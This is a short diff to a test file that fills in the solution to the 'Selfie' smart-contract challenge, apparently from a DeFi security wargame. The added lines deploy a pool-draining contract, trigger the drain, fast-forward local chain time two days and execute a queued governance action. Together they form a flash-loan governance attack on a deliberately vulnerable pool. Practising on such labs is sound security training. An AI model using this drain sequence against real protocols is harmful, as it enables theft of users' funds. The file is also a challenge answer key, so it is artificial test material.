@@ -38,7 +38,10 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        const selfiePoolDrainer = await (await ethers.getContractFactory('SelfiePoolDrainer', player)).deploy(pool.address, governance.address, token.address);
+        await selfiePoolDrainer.drainSelfiePool();
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+        await governance.executeAction(1);
     });
 
     after(async function () {
